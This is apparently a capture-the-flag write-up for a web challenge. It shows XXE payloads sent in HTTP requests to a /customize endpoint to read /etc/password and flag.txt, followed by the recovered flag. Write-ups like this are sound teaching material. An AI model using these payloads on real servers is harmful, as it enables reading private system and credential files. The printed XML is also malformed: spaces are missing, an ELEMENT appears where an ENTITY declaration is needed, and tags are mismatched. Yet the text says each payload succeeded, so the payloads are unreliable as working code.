# Special Order | Web

*I just made a new website! Check it out!
Oh, also I just remembered I need to do my math homework...
f(x) = ax2 + bx + c*

Looking around the website and with the second order hint from the second order ecuation, the only place I find I could do something was in `customize`.  This was the request:

```
POST /customize HTTP/1.1
Host: four.jh2i.com:50027
User-Agent Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Referer: http://four.jh2i.com:50027/customize
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 34
Connection: close
Cookie: session=...

{
	"color":"blue",
	"size":"40px"
}
```

Converting this to XML seems to work:

```
<?xml version="1.0" encoding="UTF-8"?>
<root>
	<color>blue</color>
	<size>40px</size>
</root>
```

The result was saved in `clean-blog.css`, so I tried to pull `/etc/password`:

```
POST /customize HTTP/1.1
Host: four.jh2i.com:50027
User-Agent Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Referer: http://four.jh2i.com:50027/customize
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 34
Connection: close
Cookie: session=...

<?xml version="1.0"?>
<!DOCTYPEfoo[
	<!ELEMENT foo(#ANY)>
	<!ELEMENT xxeSYSTEM"file:///etc/password">
]>
<root>
<color>&xxe;</color>
<size>40px</size>
</root>
```

And, the response was the `/etc/password` file.  So, I tried with the `flag.txt`:

```
POST /customize HTTP/1.1
Host: four.jh2i.com:50027
User-Agent Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Referer: http://four.jh2i.com:50027/customize
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 34
Connection: close
Cookie: session=...

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE abt[
	<!ELEMENT abtANY><!ENTITY xxeSYSTEM"file:///flag.txt">
]></root><color>&xxe;</color><size>40px</color><size>20px</size></root>
```

And got the flag:

```
* {
	font-size: 20px;
	color: flagPs3cond_0rd3r_bugs_2re_leet9933};
}
```